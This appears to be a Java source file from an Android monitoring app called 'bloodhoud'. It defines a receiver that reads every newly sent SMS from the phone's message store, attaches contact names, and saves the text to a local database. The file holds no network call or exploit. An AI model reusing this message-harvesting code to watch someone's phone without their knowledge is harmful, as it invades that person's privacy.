package it.cf.bloodhoud.client.android.receiver;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import it.cf.bloodhoud.client.android.App;
import it.cf.bloodhoud.client.android.Utils;
import it.cf.bloodhoud.client.android.model.ContactManager;
import it.cf.bloodhoud.client.android.model.Sms;
import it.cf.bloodhoud.client.android.model.SmsFactory;
import it.cf.bloodhoud.client.android.serviceApp.RepositoryLocalSQLLite;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;

public class OutgoingSmsReceiver extends BroadcastReceiver
    {
        static private final Logger LOG = LoggerFactory.getLogger(OutgoingSmsReceiver.class);

        @Override
        public void onReceive(final Context context, final Intent intent)
            {
                LOG.debug("Intent received: {}", intent.getAction());
                try
                    {
                        new OutgoingSmsLogger(context).execute();
                    }
                catch (final Exception e)
                    {
                        LOG.error(e.getMessage());
                    }
            }

        private class OutgoingSmsLogger extends AsyncTask<Void, Void, Void>
            {
                private final SharedPreferences prefs;
                private final Context           context;
                private long                    timeLastChecked;
                private final String            smsColumnName4Date    = "date";
                private final String            smsColumnName4Address = "address";
                private final String            smsColumnName4Type    = "type";
                private final String            smsColumnName4Body    = "body";

                public OutgoingSmsLogger(Context context)
                    {
                        this.prefs = context.getSharedPreferences(App.APP_FILE_PREFERENCES, Context.MODE_PRIVATE);
                        this.context = context;
                    }

                @Override
                protected Void doInBackground(Void... params)
                    {
                        LOG.debug(">>>>>>>>>> CHECK OUTGOING SMS");
                        
                        timeLastChecked = prefs.getLong(App.APP_PROP_NAME_TIMESTAMP_LASTCHECK_OUTGOING_SMS, -1L);

                        LOG.debug("SMS Message writed and sended.");
                        List<Sms> messages;
                        try
                            {
                                messages = getOutgoingSms();
                                LOG.debug("Num SMS Message writed = {}", String.valueOf(messages.size()));

                                // valorizzo il nome del contatto associato al numero di telefono da cui giunge l'SMS
                                setCantactName(ContactManager.getInstance(context), messages);
                                LOG.debug("Impostati contact name negli sms");

                                writeSmsIntoDababase(RepositoryLocalSQLLite.getRepository(context), messages);
                                LOG.debug("Sms salvati nel DB locale");
                            }
                        catch (Exception e)
                            {
                                messages = new ArrayList<Sms>();
                                LOG.error(e.getMessage());
                            }
                        
                        LOG.debug("CHECK OUTGOING SMS <<<<<<<<<<");
                        return null;
                    }
                
                private void setCantactName(ContactManager contactManager, List<Sms> smsList)
                    {
                        for (Sms sms : smsList)
                            {
                                try
                                    {
                                        sms.setNameContact(contactManager.getContactNameFromNumber(sms.getPhoneNumber()));
                                    }
                                catch (Exception e)
                                    {
                                        LOG.error("Problemi nell'impostazione del contact name per {}. Errore: {}", sms.toString(), e.getMessage());
                                    }
                            }
                    }

                private void writeSmsIntoDababase(RepositoryLocalSQLLite repo, List<Sms> smsList)
                    {
                        for (Sms sms : smsList)
                            {
                                try
                                    {
                                        repo.writeSms(sms);
                                    }
                                catch (Exception e)
                                    {
                                        LOG.error("Problemi nell'inserimento nel db di  {}. Errore: {}", sms.toString(), e.getMessage());
                                    }
                            }
                    }
                            

                private List<Sms> getOutgoingSms() throws Exception
                    {
                        List<Sms> outgoingSms = new ArrayList<Sms>();

                        // get all sent SMS records from the date last checked, in descending order
                        Cursor smsCursor;
                        smsCursor = getSmsOutgoingCursor(context);
                        LOG.debug("Num {} SMS have been sended after {}", smsCursor.getCount(), Utils.formatDatetime(timeLastChecked));

                        // if there are any new sent messages after the last time we checked
                        if (smsCursor.moveToNext())
                            {
                                Set<String> sentSms = new HashSet<String>();
                                timeLastChecked = getTimestampLikeLong(smsCursor);
                                do
                                    {
                                        long timestamp = getTimestampLikeLong(smsCursor);
                                        String address = getPhoneNumber(smsCursor);
                                        String text = getText(smsCursor);
                                        Sms sms = SmsFactory.newOutgoingSms(address, timestamp, text);

                                        if (sentSms.contains(sms.toString()))
                                            {
                                                continue; // skip that thing
                                            }
                                        // else, add it to the set
                                        sentSms.add(sms.toString());
                                        outgoingSms.add(sms);
                                    }
                                while (smsCursor.moveToNext());
                                Editor editor = prefs.edit();
                                editor.putLong(App.APP_PROP_NAME_TIMESTAMP_LASTCHECK_OUTGOING_SMS, timeLastChecked);
                                editor.commit();
                            }
                        smsCursor.close();
                        return outgoingSms;
                    }

                private Cursor getSmsOutgoingCursor(Context context) throws Exception
                    {
                        if (context == null)
                            {
                                LOG.error("Il context non deve essere null");
                                throw new Exception("Il context non deve essere null");
                            }
                        // get all sent SMS records from the date last checked, in descending order
                        Uri uri = Uri.parse("content://sms");
                        String[] projection = new String[] { smsColumnName4Date, smsColumnName4Address, smsColumnName4Body, smsColumnName4Type };
                        String selection = smsColumnName4Type + " = ? AND " + smsColumnName4Date + " > ?";
                        String[] selectionArgs = new String[] { "2", String.valueOf(timeLastChecked) };
                        String sortOrder = smsColumnName4Date + " DESC";

                        return context.getContentResolver().query(uri, projection, selection, selectionArgs, sortOrder);
                    }

                private String getPhoneNumber(Cursor smsCursor) throws Exception
                    {
                        return getStringValueFromColumn(smsColumnName4Address, smsCursor);
                    }

                private String getTimestamp(Cursor smsCursor) throws Exception
                    {
                        return getStringValueFromColumn(smsColumnName4Date, smsCursor);
                    }

                private long getTimestampLikeLong(Cursor smsCursor) throws Exception
                    {
                        return Long.parseLong(getTimestamp(smsCursor));
                    }

                private String getText(Cursor smsCursor) throws Exception
                    {
                        return getStringValueFromColumn(smsColumnName4Body, smsCursor);
                    }

                private String getStringValueFromColumn(String columnName, Cursor smsCursor) throws Exception
                    {
                        if ((columnName == null) || (columnName.length() == 0))
                            {
                                LOG.error("Il nome della colonna non deve essere null o vuoto");
                                throw new Exception("Il nome della colonna non deve essere null o vuoto");
                            }
                        if ((smsCursor == null) || (smsCursor.isClosed()))
                            {
                                LOG.error("Il cursore non deve essere null o  chiuso");
                                throw new Exception("Il cursore non deve essere null o  chiuso");
                            }

                        String stringValue = "";
                        try
                            {
                                int indexColumn = smsCursor.getColumnIndexOrThrow(columnName);
                                LOG.debug("Nome colonna <{}> ha indice = {}", columnName, indexColumn);

                                stringValue = smsCursor.getString(indexColumn);
                            }
                        catch (Exception e)
                            {
                                LOG.error(e.getMessage());
                                stringValue = "";
                            }
                        return stringValue;
                    }
            }//

    }
